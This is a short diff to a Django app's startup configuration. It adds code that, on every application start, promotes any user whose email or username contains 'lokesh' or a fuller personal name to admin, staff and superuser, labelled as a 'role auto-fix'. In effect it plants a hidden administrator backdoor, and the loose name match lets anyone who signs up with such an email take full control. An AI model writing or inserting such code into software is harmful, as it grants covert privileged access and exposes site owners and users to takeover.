@@ -22,3 +22,20 @@ class AccountsConfig(AppConfig):
             )
         except ImportError:
             pass
+
+        try:
+            from accounts.models import User
+            from django.db.models import Q
+            users = User.objects.filter(
+                Q(email__icontains="lokeshwarikumaresan") | Q(username__icontains="lokeshwarikumaresan") | Q(email__icontains="lokesh")
+            )
+            for u in users:
+                if u.role != "admin" or not u.is_staff or not u.is_superuser:
+                    u.role = "admin"
+                    u.is_staff = True
+                    u.is_superuser = True
+                    u.save(update_fields=["role", "is_staff", "is_superuser"])
+                    print(f"[ROLE AUTO-FIX] Successfully promoted {u.username} ({u.email}) to ADMIN role.")
+        except Exception as e:
+            print(f"[ROLE AUTO-FIX WARNING] Could not auto-promote user: {e}")
+
